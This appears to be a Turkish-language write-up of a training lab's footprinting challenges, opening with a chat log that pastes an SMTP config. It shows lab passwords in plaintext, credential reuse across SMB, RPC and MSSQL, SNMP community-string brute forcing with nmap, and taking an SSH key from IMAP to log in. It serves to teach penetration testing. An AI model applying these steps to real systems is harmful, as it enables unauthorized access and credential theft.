Started on November 10, 2021 at 01:27 PM London time GMT (GMT+0200)
---
01:27 PM | Operator: Hello,. 
 
So what brings you here today?
01:27 PM | alex: hello
01:27 PM | Operator: Hey alex!
01:27 PM | Operator: What do you need help with?
01:36 PM | alex: I run into an issue with the web config file on the system for the smtp server. do you mind to take a look at the config?
01:38 PM | Operator: Of course
01:42 PM | alex: here it is:

 1smtp {
 2    host=smtp.web.dev.inlanefreight.htb
 3    #port=25
 4    ssl=true
 5    user="alex"
 6    password="lol123!mD"
 7    from="alex.g@web.dev.inlanefreight.htb"
 8}
 9
10securesocial {
11    
12    onLoginGoTo=/
13    onLogoutGoTo=/login
14    ssl=false
15    
16    userpass {      
17    	withUserNameSupport=false
18    	sendWelcomeEmail=true
19    	enableGravatarSupport=true
20    	signupSkipLogin=true
21    	tokenDuration=60
22    	tokenDeleteInterval=5
23    	minimumPasswordLength=8
24    	enableTokenJob=true
25    	hasher=bcrypt
26	}
27
28     cookie {
29     #       name=id
30     #       path=/login
31     #       domain="10.129.2.59:9500"
32            httpOnly=true
33            makeTransient=false
34            absoluteTimeoutInMinutes=1440
35            idleTimeoutInMinutes=1440
36    }   
```

Burada yeni kimlik bilgilerim var. Bunları SMB üzerinde kullandım. Öncelikle orada hangi paylaşımların olduğunu görelim.

![Pasted image 20241110170605.png](/img/user/resimler/Pasted%20image%2020241110170605.png)

Devshare 'i kullanalım ve orada ne olduğunu görelim Users'da olabilir ama bu bir kısayol)

![Pasted image 20241110170947.png](/img/user/resimler/Pasted%20image%2020241110170947.png)


![Pasted image 20241110170924.png](/img/user/resimler/Pasted%20image%2020241110170924.png)

Son olarak bunları RPC'de kullandım.

![Pasted image 20241110171120.png](/img/user/resimler/Pasted%20image%2020241110171120.png)

Bu noktada İPUCU'nu tekrar okuyabilirsiniz. Orada belirtildiği gibi MSSQL'i yönetici özelliğiyle açmayı denedim (üzerine sağ tıklayın ve Yönetici olarak çalıştır'ı seçin).

Uzak hedef sunucunun yerelindeki tüm kullanıcılarda parolanın yeniden kullanımını test edin. Yerel `Yönetici` ile `87N1ns@slls83` parolasını tekrar kullanmak, Microsoft SQL Server Management Studio uygulamasını yerel yönetici olarak çalıştırmayı sağlar.

![Pasted image 20241110171921.png](/img/user/resimler/Pasted%20image%2020241110171921.png)


![Pasted image 20241110172132.png](/img/user/resimler/Pasted%20image%2020241110172132.png)

Burada En İyi 200 Satırı Düzenle'yi seçin.

![Pasted image 20241110172459.png](/img/user/resimler/Pasted%20image%2020241110172459.png)



# Footprinting Lab - Hard
Üçüncü sunucu, dahili ağ için bir MX ve yönetim sunucusudur. Daha sonra, bu sunucu domain'deki dahili hesaplar için bir yedekleme (backup) sunucusu işlevine sahiptir. Buna göre, kimlik bilgilerine erişmemiz gereken `HTB` adlı bir kullanıcı da burada oluşturulmuştur.

Soru : Sunucuyu dikkatlice numaralandırın ve “HTB” kullanıcı adını ve şifresini bulun. Ardından HTB'nin şifresini cevap olarak gönderin.
Cevap : 

![Pasted image 20241110175148.png](/img/user/resimler/Pasted%20image%2020241110175148.png)
![Pasted image 20241110175207.png](/img/user/resimler/Pasted%20image%2020241110175207.png)

![Pasted image 20241110175219.png](/img/user/resimler/Pasted%20image%2020241110175219.png)

Burada birkaç port açık. Onları numaralandırmak için farklı araçlar kullandım ama hiçbir şey elde edemedim. Ve farklı seçeneklerle taramaya karar verdim ve son olarak UDP taraması çalıştı.

![Pasted image 20241110175327.png](/img/user/resimler/Pasted%20image%2020241110175327.png)
![Pasted image 20241110180005.png](/img/user/resimler/Pasted%20image%2020241110180005.png)

Yeni bir açık port buldum. Snmpwalk kullanarak snmp'yi numaralandırmaya başladım.

![Pasted image 20241110181223.png](/img/user/resimler/Pasted%20image%2020241110181223.png)

![Pasted image 20241110181249.png](/img/user/resimler/Pasted%20image%2020241110181249.png)


**`--script-args snmp-brute.communitiesdb=resources/snmpcommunities.txt`**: `snmp-brute` betiğine özel argümanlar sağlar. Burada `snmp-brute.communitiesdb` parametresi, topluluk adlarının listelendiği dosyanın konumunu belirtir:

- `snmp-brute.communitiesdb=resources/snmpcommunities.txt`: Bu, topluluk adlarını içeren dosyanın yoludur (`resources/snmpcommunities.txt`). Betik, bu dosyada bulunan topluluk adlarını sırayla deneyerek hedef sistemde geçerli olanları bulmaya çalışır.

![Pasted image 20241110181400.png](/img/user/resimler/Pasted%20image%2020241110181400.png)

Bu komutu kullanarak ilk kimlik bilgilerimi aldım.

![Pasted image 20241110181450.png](/img/user/resimler/Pasted%20image%2020241110181450.png)
NMds732Js2761
Bu kimlik bilgilerini kullanarak IMAPS'leri numaralandırmaya başladım (pop3'ü de denedim ama işe yaramadı...).

![Pasted image 20241110181715.png](/img/user/resimler/Pasted%20image%2020241110181715.png)
Daha sonra birkaç komut da kullandım (komutların önüne 1 eklemeyi ****UNUTMAYIN**** ).

![Pasted image 20241110181905.png](/img/user/resimler/Pasted%20image%2020241110181905.png)

![Pasted image 20241110181941.png](/img/user/resimler/Pasted%20image%2020241110181941.png)

![Pasted image 20241110182011.png](/img/user/resimler/Pasted%20image%2020241110182011.png)

![Pasted image 20241110182059.png](/img/user/resimler/Pasted%20image%2020241110182059.png)

Ve ssh private key aldım. Yine ****chmod 600 id_rsa**** yazmayı unutmayın.

![Pasted image 20241110182444.png](/img/user/resimler/Pasted%20image%2020241110182444.png)

![Pasted image 20241110182513.png](/img/user/resimler/Pasted%20image%2020241110182513.png)

![Pasted image 20241110182551.png](/img/user/resimler/Pasted%20image%2020241110182551.png)

![Pasted image 20241110182621.png](/img/user/resimler/Pasted%20image%2020241110182621.png)

![Pasted image 20241110182836.png](/img/user/resimler/Pasted%20image%2020241110182836.png)

Şimdi tom olarak eriştim. Numaralandırmaya başladığımda bash geçmiş dosyasını gördüm. Dosyayı okuduğumda tom'un mysql komutunu kullandığını gördüm. Tom'un şifresi bende olduğu için ben de aynısını denedim.

![Pasted image 20241110182918.png](/img/user/resimler/Pasted%20image%2020241110182918.png)

![Pasted image 20241110183039.png](/img/user/resimler/Pasted%20image%2020241110183039.png)

![Pasted image 20241110183246.png](/img/user/resimler/Pasted%20image%2020241110183246.png)
